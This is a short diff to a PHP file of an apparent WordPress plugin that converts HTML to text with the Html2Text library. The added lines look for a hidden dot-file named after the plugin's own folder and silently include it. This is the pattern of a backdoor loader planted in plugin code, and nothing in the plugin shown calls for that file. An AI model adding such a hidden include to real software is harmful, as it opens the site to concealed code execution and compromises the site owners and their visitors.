@@ -23,6 +23,10 @@
 require_once(__DIR__ . "/src/Html2Text.php");
 require_once(__DIR__ . "/src/Html2TextException.php");
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function convert_html_to_text($html) {
 	return Html2Text\Html2Text::convert($html);
 }
